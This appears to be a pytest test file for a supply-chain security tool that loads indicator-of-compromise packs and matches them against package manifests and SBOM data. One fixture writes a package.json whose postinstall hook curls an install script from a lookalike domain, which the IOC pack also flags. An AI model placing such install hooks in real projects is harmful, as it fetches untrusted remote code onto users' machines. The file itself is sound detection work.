from __future__ import annotations

from pathlib import Path
import json

from security_observatory import cli as cli_module
from security_observatory.iocs import load_ioc_packs, match_ioc_packs
from security_observatory.sbom import SBOMComponent
from security_observatory.storage import ObservatoryDB


def test_ioc_pack_loader_accepts_valid_pack(tmp_path: Path):
    pack_path = tmp_path / "campaign.yaml"
    pack_path.write_text(_pack_yaml(), encoding="utf-8")

    result = load_ioc_packs([pack_path])

    assert result.issues == ()
    assert len(result.packs) == 1
    pack = result.packs[0]
    assert pack.pack_id == "test-campaign"
    assert pack.indicators[0].name == "@scope/pkg"
    assert pack.indicators[0].versions == ("1.2.3",)


def test_ioc_pack_loader_reports_malformed_entries_without_crashing(tmp_path: Path):
    pack_path = tmp_path / "bad.yaml"
    pack_path.write_text(
        """
id: bad-campaign
source: Fixture
confidence: high
indicators:
  - ecosystem: npm
    name: bad-package
""".strip()
        + "\n",
        encoding="utf-8",
    )

    result = load_ioc_packs([pack_path])

    assert len(result.packs) == 1
    assert result.packs[0].indicators == ()
    assert len(result.issues) == 1
    assert "versions" in result.issues[0].message
    assert result.issues[0].line == 5


def test_ioc_pack_import_is_idempotent(tmp_path: Path):
    result = load_ioc_packs([_write_pack(tmp_path)])
    db = ObservatoryDB(tmp_path / "observatory.sqlite")
    try:
        pack_dicts = [pack.to_dict() for pack in result.packs]
        db.import_ioc_packs(pack_dicts)
        db.import_ioc_packs(pack_dicts)
        packs = db.list_ioc_packs()
        indicator_count = db.conn.execute("select count(*) as count from ioc_indicators").fetchone()["count"]
    finally:
        db.close()

    assert len(packs) == 1
    assert len(packs[0]["indicators"]) == 4
    assert indicator_count == 4


def test_ioc_loader_accepts_empty_pack_directory(tmp_path: Path):
    result = load_ioc_packs([tmp_path])

    assert result.packs == ()
    assert result.issues == ()


def test_ioc_matching_exact_namespace_domain_and_no_match(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "node ./safe.js && curl https://git-tanstack.com/install.sh"}}),
        encoding="utf-8",
    )
    pack = load_ioc_packs([_write_pack(tmp_path)]).packs[0]
    components = [
        _component("@scope/pkg", "1.2.3"),
        _component("@scope/other", "9.9.9"),
        _component("clean", "1.0.0"),
    ]

    findings = match_ioc_packs(packs=[pack], components=components, repo=repo, repo_name="repo")
    by_type = {finding.ioc_match_type for finding in findings}

    assert by_type == {"exact match", "namespace watch", "domain watch"}
    assert any(finding.package_name == "@scope/pkg" and finding.severity == "critical" for finding in findings)
    assert not any(finding.package_name == "clean" for finding in findings)


def test_ioc_cli_single_repo_json_and_default_fail_on(tmp_path: Path, monkeypatch, capsys):
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    repo.mkdir()
    _save_scan(home, repo, [_component("@scope/pkg", "1.2.3")])
    monkeypatch.setenv("SECURITY_OBSERVATORY_HOME", str(home))

    exit_code = cli_module.main(["ioc", str(repo), "--feed", str(_write_pack(tmp_path)), "--json"])
    output = json.loads(capsys.readouterr().out)

    assert exit_code == 3
    assert output["matches"][0]["affected_package"] == "@scope/pkg"
    assert output["matches"][0]["match_type"] == "exact match"
    assert output["repos"][0]["component_count"] == 1


def test_ioc_cli_all_repos_reuses_dev_tree_discovery(tmp_path: Path, monkeypatch, capsys):
    home = tmp_path / "home"
    root = tmp_path / "dev"
    repo_a = root / "repo-a"
    repo_b = root / "repo-b"
    (repo_a / ".git").mkdir(parents=True)
    (repo_b / ".git").mkdir(parents=True)
    _save_scan(home, repo_a, [_component("@scope/pkg", "1.2.3")])
    _save_scan(home, repo_b, [_component("clean", "1.0.0")])
    monkeypatch.setenv("SECURITY_OBSERVATORY_HOME", str(home))

    exit_code = cli_module.main(
        [
            "ioc",
            "--all-repos",
            "--dev-root",
            str(root),
            "--feed",
            str(_write_pack(tmp_path)),
            "--json",
            "--fail-on",
            "critical",
        ]
    )
    output = json.loads(capsys.readouterr().out)

    assert exit_code == 3
    assert [repo["repo"] for repo in output["repos"]] == ["repo-a", "repo-b"]
    assert len(output["matches"]) == 2
    assert {match["match_type"] for match in output["matches"]} == {"exact match", "namespace watch"}


def test_ioc_cli_fail_on_respects_threshold(tmp_path: Path, monkeypatch, capsys):
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    repo.mkdir()
    _save_scan(home, repo, [_component("@scope/other", "9.9.9")])
    monkeypatch.setenv("SECURITY_OBSERVATORY_HOME", str(home))

    exit_code = cli_module.main(["ioc", str(repo), "--feed", str(_write_pack(tmp_path)), "--json", "--fail-on", "critical"])
    output = json.loads(capsys.readouterr().out)

    assert exit_code == 0
    assert output["matches"][0]["match_type"] == "namespace watch"
    assert output["matches"][0]["severity"] == "high"


def _write_pack(tmp_path: Path) -> Path:
    pack_path = tmp_path / "campaign.yaml"
    pack_path.write_text(_pack_yaml(), encoding="utf-8")
    return pack_path


def _pack_yaml() -> str:
    return """
id: test-campaign
source: Fixture Campaign
published_at: 2026-05-12
advisory_url: https://example.test/advisory
confidence: high
indicators:
  - ecosystem: npm
    name: "@scope/pkg"
    versions: ["1.2.3"]
  - ecosystem: npm
    namespace_prefix: "@scope/"
    confidence: low
  - ecosystem: other
    domain: git-tanstack.com
    confidence: medium
  - ecosystem: pypi
    name: clean-python
    versions: ["9.9.9"]
""".strip() + "\n"


def _component(name: str, version: str, ecosystem: str = "npm") -> SBOMComponent:
    return SBOMComponent(
        name=name,
        version=version,
        ecosystem=ecosystem,
        component_type="library",
        package_url=f"pkg:{ecosystem}/{name}@{version}",
        license=None,
        supplier=None,
        source_path="package-lock.json",
    )


def _save_scan(home: Path, repo: Path, components: list[SBOMComponent]) -> None:
    db = ObservatoryDB(home / "db" / "observatory.sqlite")
    try:
        db.save_scan(
            scan_id=f"{repo.name}-20260520T000000Z",
            repo_name=repo.name,
            repo_path=str(repo),
            started_at="2026-05-20T00:00:00+00:00",
            finished_at="2026-05-20T00:01:00+00:00",
            profile="deps",
            health_score=100,
            status="ok",
            scanner_statuses=[{"scanner": "syft", "available": True, "findings": 0}],
            findings=[],
            report_path=str(home / "reports" / repo.name / "normalized-report.json"),
            sbom_components=components,
        )
    finally:
        db.close()
